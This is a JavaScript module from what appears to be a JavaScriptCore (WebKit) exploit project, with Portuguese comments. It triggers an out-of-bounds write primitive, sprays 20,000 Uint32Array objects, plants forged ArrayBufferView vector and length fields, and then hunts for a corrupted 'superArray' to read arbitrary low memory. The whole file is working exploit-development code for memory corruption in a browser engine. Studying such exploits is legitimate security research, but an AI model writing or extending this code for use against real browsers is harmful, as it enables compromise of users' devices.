// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real, // <--- ADICIONADO AQUI
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

// ============================================================\n// DEFINIÇÕES DE CONSTANTES GLOBAIS DO MÓDULO\n// ============================================================
const FNAME_SPRAY_INVESTIGATE = "sprayAndCorruptABView_v9";

const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const FOCUSED_VICTIM_ABVIEW_START_OFFSET = 0x50;

const NUM_SPRAY_OBJECTS = 20000;
const SPRAY_MARKER_VALUE_BASE = 0x41410000;
const ADV64_ZERO = new AdvancedInt64(0, 0);
const CORRUPTION_VALUE_UINT32_FFFFFFFF = 0xFFFFFFFF;


// ============================================================\n// VARIÁVEIS GLOBAIS DE MÓDULO\n// ============================================================
let sprayedVictimObjects = [];

export async function sprayAndInvestigateObjectExposure() { // O nome da função exportada permanece o mesmo
    logS3(`--- Iniciando ${FNAME_SPRAY_INVESTIGATE}: Corromper ArrayBufferView e Testar Leitura Absoluta ---`, "test", FNAME_SPRAY_INVESTIGATE);

    try {
        await triggerOOB_primitive();
        // A linha do erro original (37) estaria próxima a esta verificação:
        if (!oob_array_buffer_real || !oob_dataview_real) { // Agora oob_dataview_real deve estar definido
            logS3("Falha ao inicializar o ambiente OOB. oob_array_buffer_real ou oob_dataview_real não estão definidos após triggerOOB_primitive.", "critical", FNAME_SPRAY_INVESTIGATE);
            return;
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_SPRAY_INVESTIGATE);

        // FASE 1: Pulverizar objetos Uint32Array
        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} objetos Uint32Array(8)...`, "info", FNAME_SPRAY_INVESTIGATE);
        sprayedVictimObjects = [];
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            const u32arr = new Uint32Array(8);
            u32arr[0] = SPRAY_MARKER_VALUE_BASE + i;
            sprayedVictimObjects.push(u32arr);
        }
        logS3("Pulverização de Uint32Array concluída.", "good", FNAME_SPRAY_INVESTIGATE);
        await PAUSE_S3(50);

        // FASE 2: Plantar valores no oob_array_buffer_real
        logS3(`FASE 2: Plantando futuros metadados (m_vector=0, m_length=0xFFFFFFFF) no oob_array_buffer_real...`, "info", FNAME_SPRAY_INVESTIGATE);
        const targetVectorOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.VECTOR_OFFSET;
        const targetLengthOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.LENGTH_OFFSET;

        logS3(`  Plantando futuro m_vector (0) em oob_buffer[${toHex(targetVectorOffset)}]`, "info", FNAME_SPRAY_INVESTIGATE);
        oob_write_absolute(targetVectorOffset, ADV64_ZERO, 8);

        logS3(`  Plantando futuro m_length (0xFFFFFFFF) em oob_buffer[${toHex(targetLengthOffset)}]`, "info", FNAME_SPRAY_INVESTIGATE);
        oob_write_absolute(targetLengthOffset, CORRUPTION_VALUE_UINT32_FFFFFFFF, 4);

        logS3("Valores plantados ANTES da corrupção trigger:", "info", FNAME_SPRAY_INVESTIGATE);
        const plantedVector = oob_read_absolute(targetVectorOffset, 8);
        const plantedLength = oob_read_absolute(targetLengthOffset, 4);
        logS3(`    Verificação m_vector plantado em oob_buffer[${toHex(targetVectorOffset)}]: ${isAdvancedInt64Object(plantedVector) ? plantedVector.toString(true) : toHex(plantedVector)} (Esperado: ${ADV64_ZERO.toString(true)})`, "info", FNAME_SPRAY_INVESTIGATE);
        logS3(`    Verificação m_length plantado em oob_buffer[${toHex(targetLengthOffset)}]: ${toHex(plantedLength)} (Esperado: ${toHex(CORRUPTION_VALUE_UINT32_FFFFFFFF)})`, "info", FNAME_SPRAY_INVESTIGATE);
        await PAUSE_S3(50);

        // FASE 3: Acionar a Corrupção OOB
        logS3(`FASE 3: Realizando escrita OOB em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_SPRAY_INVESTIGATE);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3("Escrita OOB de trigger realizada.", "good", FNAME_SPRAY_INVESTIGATE);
        await PAUSE_S3(100);

        // FASE 4: Verificar novamente os valores plantados no oob_array_buffer_real
        logS3(`FASE 4: Verificando novamente os valores plantados no oob_array_buffer_real APÓS o trigger...`, "info", FNAME_SPRAY_INVESTIGATE);
        const m_vector_check_val = oob_read_absolute(targetVectorOffset, 8);
        const m_length_check_val = oob_read_absolute(targetLengthOffset, 4);

        logS3(`    m_vector lido de oob_buffer[${toHex(targetVectorOffset)}]: ${isAdvancedInt64Object(m_vector_check_val) ? m_vector_check_val.toString(true) : String(m_vector_check_val)}`, "info", FNAME_SPRAY_INVESTIGATE);
        logS3(`    m_length lido de oob_buffer[${toHex(targetLengthOffset)}]: ${toHex(m_length_check_val)}`, "info", FNAME_SPRAY_INVESTIGATE);

        if (isAdvancedInt64Object(m_vector_check_val) && m_vector_check_val.equals(ADV64_ZERO) && m_length_check_val === CORRUPTION_VALUE_UINT32_FFFFFFFF) {
            logS3(`    Valores para corrupção permanecem corretos no oob_array_buffer_real (em offsets ${toHex(FOCUSED_VICTIM_ABVIEW_START_OFFSET)}+).`, "good", FNAME_SPRAY_INVESTIGATE);
            logS3(`    !!!! SETUP PARA CORRUPÇÃO DE METADADOS EM HEAP (via oob_buffer em ${toHex(FOCUSED_VICTIM_ABVIEW_START_OFFSET)}) APARENTEMENTE BEM SUCEDIDO !!!!`, "vuln", FNAME_SPRAY_INVESTIGATE);
        } else {
            logS3(`    ALERTA: Valores para corrupção no oob_array_buffer_real foram alterados ou não foram plantados corretamente.`, "warn", FNAME_SPRAY_INVESTIGATE);
        }
        await PAUSE_S3(50);

        // FASE 5: Tentar identificar o 'superArray'
        logS3(`FASE 5: Tentando identificar o 'superArray' pela sua propriedade 'length'...`, "info", FNAME_SPRAY_INVESTIGATE);
        let foundSuperArrayIndex = -1;
        for (let i = 0; i < sprayedVictimObjects.length; i++) {
            if (sprayedVictimObjects[i] && sprayedVictimObjects[i].length === CORRUPTION_VALUE_UINT32_FFFFFFFF) {
                foundSuperArrayIndex = i;
                break;
            }
        }

        if (foundSuperArrayIndex !== -1) {
            const superArray = sprayedVictimObjects[foundSuperArrayIndex];
            logS3(`    !!! 'superArray' IDENTIFICADO no índice ${foundSuperArrayIndex} (length: ${superArray.length}) !!!`, "vuln", FNAME_SPRAY_INVESTIGATE);
            document.title = "SUPER_ARRAY IDENTIFICADO!";

            logS3(`    Testando leitura com superArray (que agora deve ler da memória a partir do endereço 0x0)...`, "info", FNAME_SPRAY_INVESTIGATE);
            try {
                let val_at_0 = superArray[0];
                logS3(`    superArray[0] (leitura de 0x00000000): ${toHex(val_at_0)}`, "leak", FNAME_SPRAY_INVESTIGATE);

                let val_at_4 = superArray[1];
                logS3(`    superArray[1] (leitura de 0x00000004): ${toHex(val_at_4)}`, "leak", FNAME_SPRAY_INVESTIGATE);
                
                let val_at_1000_offset = 0x1000 / 4;
                let val_at_1000 = superArray[val_at_1000_offset];
                logS3(`    superArray[${toHex(val_at_1000_offset)}] (leitura de ${toHex(val_at_1000_offset * 4)}): ${toHex(val_at_1000)}`, "leak", FNAME_SPRAY_INVESTIGATE);

                logS3(`    Leitura de endereços baixos com superArray PARECE ter funcionado (ou não crashou).`, "good", FNAME_SPRAY_INVESTIGATE);
                document.title = "SuperArray LEU Addrs BAIXOS!";

            } catch (e) {
                logS3(`    ERRO ao tentar ler com superArray: ${e.message}`, "error", FNAME_SPRAY_INVESTIGATE);
                if (e.stack) logS3(`    Stack: ${e.stack}`, "error", FNAME_SPRAY_INVESTIGATE);
                document.title = "SuperArray ERRO LEITURA!";
            }
        } else {
            logS3("    Falha em identificar o 'superArray' pela propriedade 'length'. Nenhum array pulverizado tem length 0xFFFFFFFF.", "error", FNAME_SPRAY_INVESTIGATE);
            logS3("    Isso pode significar que a corrupção do objeto JS na heap não ocorreu como esperado, ou o objeto corrompido não era um dos pulverizados.", "error", FNAME_SPRAY_INVESTIGATE);
            document.title = "SuperArray NÃO Encontrado!";
        }

        logS3("INVESTIGAÇÃO DETALHADA COM SPRAY CONCLUÍDA.", "test", FNAME_SPRAY_INVESTIGATE);

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_SPRAY_INVESTIGATE}: ${e.message}`, "critical", FNAME_SPRAY_INVESTIGATE);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_SPRAY_INVESTIGATE);
        document.title = `${FNAME_SPRAY_INVESTIGATE} FALHOU!`;
    } finally {
        sprayedVictimObjects = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_SPRAY_INVESTIGATE} Concluído ---`, "test", FNAME_SPRAY_INVESTIGATE);
    }
}
